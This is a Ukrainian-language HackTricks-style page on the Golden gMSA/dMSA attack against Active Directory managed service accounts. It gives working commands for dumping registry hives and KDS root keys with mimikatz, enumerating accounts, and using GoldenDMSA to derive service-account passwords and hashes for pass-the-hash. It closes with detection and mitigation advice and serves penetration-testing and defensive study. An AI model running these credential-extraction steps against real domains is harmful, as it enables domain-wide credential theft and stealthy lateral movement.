# Golden gMSA/dMSA Attack (Офлайн похідна паролів керованих облікових записів сервісів)

{{#include ../../banners/hacktricks-training.md}}

## Огляд

Керовані облікові записи сервісів Windows (MSA) – це спеціальні принципи, призначені для запуску сервісів без необхідності вручну керувати їх паролями. Існує два основних варіанти:

1. **gMSA** – груповий керований обліковий запис сервісу – може використовуватися на кількох хостах, які авторизовані в його атрибуті `msDS-GroupMSAMembership`.
2. **dMSA** – делегований керований обліковий запис сервісу – (попередній перегляд) наступник gMSA, що спирається на ту ж криптографію, але дозволяє більш детальні сценарії делегування.

Для обох варіантів **пароль не зберігається** на кожному контролері домену (DC) як звичайний NT-хеш. Натомість кожен DC може **вивести** поточний пароль на льоту з:

* Лісового **KDS Root Key** (`KRBTGT\KDS`) – випадковим чином згенерованим секретом з GUID-іменем, реплікованим на кожен DC під контейнером `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* Цільового облікового запису **SID**.
* Переконаним **ManagedPasswordID** (GUID), знайденим в атрибуті `msDS-ManagedPasswordId`.

Виведення виглядає так: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 байт блоб, який врешті-решт **base64-кодується** і зберігається в атрибуті `msDS-ManagedPassword`. Ніякий трафік Kerberos або взаємодія з доменом не потрібні під час звичайного використання пароля – член хоста виводить пароль локально, якщо знає три вхідні дані.

## Golden gMSA / Golden dMSA Attack

Якщо зловмисник може отримати всі три вхідні дані **офлайн**, він може обчислити **дійсні поточні та майбутні паролі** для **будь-якого gMSA/dMSA в лісі** без повторного звернення до DC, обходячи:

* Логи попередньої аутентифікації Kerberos / запитів квитків
* Аудит читання LDAP
* Інтервали зміни паролів (вони можуть попередньо обчислити)

Це аналогічно *Золотому квитку* для облікових записів сервісів.

### Передумови

1. **Компрометація на рівні лісу** **одного DC** (або Enterprise Admin). Доступ `SYSTEM` достатній.
2. Можливість перерахувати облікові записи сервісів (читання LDAP / брутфорс RID).
3. Робоча станція .NET ≥ 4.7.2 x64 для запуску [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) або еквівалентного коду.

### Фаза 1 – Витяг KDS Root Key

Витяг з будь-якого DC (Тіньове копіювання томів / сирі хаби SAM+SECURITY або віддалені секрети):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too
```
Базовий рядок base64 з міткою `RootKey` (ім'я GUID) потрібен на наступних етапах.

### Фаза 2 – Перерахування об'єктів gMSA/dMSA

Отримайте принаймні `sAMAccountName`, `objectSid` та `msDS-ManagedPasswordId`:
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) реалізує допоміжні режими:
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
### Фаза 3 – Вгадати / Виявити ManagedPasswordID (коли відсутній)

Деякі розгортання *видаляють* `msDS-ManagedPasswordId` з ACL-захищених читань.  
Оскільки GUID є 128-бітним, наївний брутфорс є недоцільним, але:

1. Перші **32 біти = Unix epoch time** створення облікового запису (з роздільною здатністю в хвилинах).  
2. За ними слідують 96 випадкових бітів.

Отже, **вузький список слів для кожного облікового запису** (± кілька годин) є реалістичним.
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Інструмент обчислює кандидатні паролі та порівнює їх base64 blob з реальним атрибутом `msDS-ManagedPassword` – збіг вказує на правильний GUID.

### Фаза 4 – Офлайн обчислення пароля та конвертація

Як тільки ManagedPasswordID відомий, дійсний пароль знаходиться в одному командному рядку:
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID>

# convert to NTLM / AES keys for pass-the-hash / pass-the-ticket
GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
```
Отримані хеші можуть бути інжектовані за допомогою **mimikatz** (`sekurlsa::pth`) або **Rubeus** для зловживання Kerberos, що дозволяє здійснювати прихований **бічний рух** та **постійність**.

## Виявлення та пом'якшення

* Обмежте можливості **резервного копіювання DC та читання реєстру** для адміністраторів Tier-0.
* Моніторте створення **Режиму відновлення служб каталогів (DSRM)** або **Копії тіньового тому** на DC.
* Аудитуйте читання / зміни до `CN=Master Root Keys,…` та прапорців `userAccountControl` облікових записів служб.
* Виявляйте незвичайні **записи паролів base64** або раптове повторне використання паролів служб на різних хостах.
* Розгляньте можливість перетворення облікових записів gMSA з високими привілеями на **класичні облікові записи служб** з регулярними випадковими ротаціями, де ізоляція Tier-0 неможлива.

## Інструменти

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – реалізація посилання, використана на цій сторінці.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket з використанням похідних AES ключів.

## Посилання

- [Golden dMSA – обхід аутентифікації для делегованих облікових записів керованих служб](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [Репозиторій Semperis/GoldenDMSA на GitHub](https://github.com/Semperis/GoldenDMSA)
- [Improsec – атака на довіру Golden gMSA](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
